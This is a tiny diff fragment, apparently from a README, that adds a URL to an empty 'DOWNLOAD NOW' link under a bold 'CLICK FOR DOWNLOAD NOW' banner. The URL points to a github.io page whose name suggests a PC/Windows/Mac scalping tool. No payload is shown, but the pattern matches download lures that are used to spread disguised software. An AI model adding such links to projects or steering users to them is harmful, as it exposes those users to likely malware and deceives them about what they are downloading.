@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://scalping-boes-pcwinmac-oe94.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
